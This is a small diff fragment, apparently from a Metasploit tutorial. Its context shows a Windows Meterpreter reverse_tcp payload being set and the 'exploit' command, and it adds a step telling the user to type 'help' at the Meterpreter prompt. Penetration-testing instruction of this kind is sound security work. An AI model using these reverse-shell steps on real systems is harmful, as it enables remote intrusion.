@@ -114,3 +114,4 @@ set payload windows/meterpreter/reverse_tcp
 ```
 exploit
 ```
+4. Type `help` at the Meterpreter prompt to see all available commands
